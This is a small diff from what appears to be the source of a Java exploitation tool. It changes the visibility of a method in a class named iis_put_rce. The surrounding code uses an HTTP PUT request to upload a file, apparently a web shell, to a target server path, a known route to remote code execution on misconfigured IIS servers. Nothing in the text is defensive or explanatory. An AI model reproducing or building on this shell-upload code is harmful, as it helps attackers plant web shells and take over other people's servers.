@@ -20,7 +20,7 @@ public class iis_put_rce implements Exploitlnterface {
         return null;
     }
 
-    public Boolean att(String url, TextArea textArea, String filePath, String uri) {
+    private Boolean att(String url, TextArea textArea, String filePath, String uri) {
         HashMap<String, String> head = new HashMap<>();
         head.put("Content-Type", "application/octet-stream");
         Response put = HttpTools.put(url + uri, shell.readFile(filePath), head, "utf-8");
